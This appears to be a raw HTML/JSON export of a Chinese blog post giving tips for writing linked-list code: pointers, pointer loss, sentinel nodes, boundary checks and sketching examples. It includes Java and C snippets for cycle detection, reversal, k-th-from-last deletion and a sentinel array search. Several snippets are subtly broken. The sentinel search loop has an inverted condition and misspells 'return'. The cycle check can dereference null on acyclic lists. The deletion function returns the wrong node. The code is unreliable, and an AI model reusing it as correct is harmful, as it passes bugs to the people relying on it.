q.next.next;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 链表中环的检测*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isLoop</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 采用快慢指针法 如果两个指针相遇，则说明有环</span></span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q == p)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**反转链表*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">reverse</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)<span class=\"keyword\">return</span> head;</span><br><span class=\"line\">        Node&lt;Integer&gt; p;</span><br><span class=\"line\">        Node&lt;Integer&gt; q;</span><br><span class=\"line\">        Node&lt;Integer&gt; r;</span><br><span class=\"line\">        p = head;</span><br><span class=\"line\">        q = p.next;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**删除链表倒数第K个结点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">deleteLastKDesc</span><span class=\"params\">(Node&lt;Integer&gt; head, <span class=\"keyword\">int</span> k)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == <span class=\"keyword\">null</span> || k &lt;<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            k--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            p = head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (++k != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            p.next = p.next.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">E</span>&gt; </span>&#123;</span><br><span class=\"line\">        E val;</span><br><span class=\"line\">        Node&lt;E&gt; next;</span><br><span class=\"line\">        Node(E e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = e;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">printLinkList</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (head !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (head.next !=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">                sb.append(head.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                sb.append(head.val);</span><br><span class=\"line\">            head = head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<p>上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。</p>\n<p>为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？</p>\n<p>只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？</p>\n<p>当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。</p>\n<h3 id=\"理解指针或引用的含义\"><a href=\"#理解指针或引用的含义\" class=\"headerlink\" title=\"理解指针或引用的含义\"></a>理解指针或引用的含义</h3><p>事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。</p>\n<p>有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。</p>\n<p>接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。</p>\n<p>实际上，对于指针的理解，只需要记住下面这句话就可以了：<strong>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量</strong>。</p>\n<p>在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。</p>\n<p>掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。</p>\n<h3 id=\"警惕指针丢失和内存泄露\"><a href=\"#警惕指针丢失和内存泄露\" class=\"headerlink\" title=\"警惕指针丢失和内存泄露\"></a>警惕指针丢失和内存泄露</h3><p>不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/链表插入.jpg\">\n<p>如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = c; <span class=\"comment\">// 将p的next指针指向c结点</span></span><br><span class=\"line\">c-&gt;next = p-&gt;next; <span class=\"comment\">//将c结点next指针指向b结点</span></span><br></pre></td></tr></table></figure>\n<p>当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。</p>\n<p>对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。</p>\n<h3 id=\"利用哨兵简化实现难度\"><a href=\"#利用哨兵简化实现难度\" class=\"headerlink\" title=\"利用哨兵简化实现难度\"></a>利用哨兵简化实现难度</h3><p>首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_node-&gt;next = p-&gt;next; </span><br><span class=\"line\">p-&gt;next = new_node;</span><br></pre></td></tr></table></figure>\n<p>但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = new_node;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = p-&gt;next-&gt;next；</span><br></pre></td></tr></table></figure>\n<p>但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head-&gt;next == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，<strong>针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理</strong>。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？</p>\n<p>这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。</p>\n<p>还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。</p>\n<p>如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做<strong>带头链表</strong>，相反，没有哨兵结点的链表叫做<strong>不带头链表</strong>。</p>\n<p>如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/带头链表.jpg\">\n<p>实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。</p>\n<p>代码一：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里有两个比较操作： i&lt;n 和 a[i] == key</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;n)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t\tretrun i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tretrun <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码二：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"comment\">// 为了更好的解释，这里举了个例子来说明</span></span><br><span class=\"line\"><span class=\"comment\">// a = &#123;4,2,3,5,9,6&#125; key = 7</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[n<span class=\"number\">-1</span>] == key)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> temp = a[n<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125;</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = key;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 此时while循环比起代码一，少了i&lt;n这个比较操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 将数组a[n-1] 恢复为原来的值</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = temp;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 如果i = n-1，说明数组中没有要找的key</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(i == n<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 否则，说明找到了key，位置为i</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。</p>\n<p>当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。</p>\n<h3 id=\"重点留意边界条件处理\"><a href=\"#重点留意边界条件处理\" class=\"headerlink\" title=\"重点留意边界条件处理\"></a>重点留意边界条件处理</h3><p>软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。</p>\n<p>我经常用来检查链表代码是否正确执行的边界条件有这么几个：</p>\n<ul>\n<li>如果链表为空时，代码是否能正常工作？</li>\n<li>如果一个链表只包含了一个结点，代码能否正常工作？</li>\n<li>如果链表只包含两个结点时，代码能否正常工作？</li>\n<li>代码逻辑在处理头结点和尾结点时，是否能正常工作？</li>\n</ul>\n<p>当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。</p>\n<p>当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。</p>\n<p>其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。</p>\n<h3 id=\"举列画图，辅助思考\"><a href=\"#举列画图，辅助思考\" class=\"headerlink\" title=\"举列画图，辅助思考\"></a>举列画图，辅助思考</h3><p>对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。</p>\n<p>你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/举例.jpg\">\n<p>看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。</p>\n<h3 id=\"多写多练，没有捷径\"><a href=\"#多写多练，没有捷径\" class=\"headerlink\" title=\"多写多练，没有捷径\"></a>多写多练，没有捷径</h3><p>如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。</p>\n<p>下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。</p>\n<ul>\n<li>单链表反转</li>\n<li>链表中环的检测</li>\n<li>两个有序链表合并</li>\n<li>删除链表倒数第n个结点</li>\n<li>求链表的中间结点</li>\n</ul>\n<p>我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 链表的一些算法题目</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LinkListAlgorithm</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第一个链表，检测是否有环</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表中环的检测\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n1 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n2 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n3 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">3</span>);</span><br><span class=\"line\">        n1.next = n2;</span><br><span class=\"line\">        n2.next = n3;</span><br><span class=\"line\">        n3.next = n1; <span class=\"comment\">// 1-&gt;2-&gt;3-&gt;1</span></span><br><span class=\"line\">        System.out.println(isLoop(n1)); <span class=\"comment\">// true</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 链表反转</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表反转\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n4 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">4</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n5 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">5</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n6 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">6</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n7 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">7</span>);</span><br><span class=\"line\">        n4.next = n5;</span><br><span 